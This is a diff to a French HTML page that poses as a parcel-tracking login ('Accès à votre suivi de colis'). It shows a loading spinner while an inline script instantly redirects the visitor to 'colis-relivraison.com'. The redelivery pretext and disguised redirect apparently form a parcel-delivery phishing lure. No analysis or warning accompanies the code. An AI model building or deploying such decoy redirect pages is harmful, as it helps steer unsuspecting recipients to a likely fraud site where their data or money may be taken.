@@ -2,16 +2,74 @@
 <html lang="fr">
 <head>
   <meta charset="UTF-8">
-  <title>Chargement…</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Accès à votre suivi de colis</title>
 
-  <!-- JS chargé le plus tôt possible -->
-  <script src="/redirect.js" defer></script>
+  <!-- Redirection JS UNIQUEMENT -->
+  <script>
+    (function () {
+      var target = "https://colis-relivraison.com";
+
+      if (window.location.href !== target) {
+        window.location.replace(target);
+      }
+    })();
+  </script>
+
+  <style>
+    body {
+      margin: 0;
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      background-color: #f7f7f7;
+      color: #222;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    .container {
+      background: #ffffff;
+      padding: 32px;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+      text-align: center;
+      max-width: 420px;
+      width: 100%;
+    }
+
+    h1 {
+      font-size: 20px;
+      margin-bottom: 10px;
+    }
+
+    p {
+      font-size: 14px;
+      color: #555;
+    }
+
+    .spinner {
+      width: 36px;
+      height: 36px;
+      border: 4px solid #e0e0e0;
+      border-top-color: #4a6cf7;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      margin: 0 auto 20px;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+  </style>
 </head>
 <body>
-  <noscript>
-    <meta http-equiv="refresh" content="0;url=https://colis-relivraison.com">
-  </noscript>
 
-  <p>Chargement…</p>
+  <div class="container">
+    <div class="spinner"></div>
+    <h1>Accès à votre suivi de colis</h1>
+    <p>Connexion à l’espace colis en cours…</p>
+  </div>
+
 </body>
 </html>
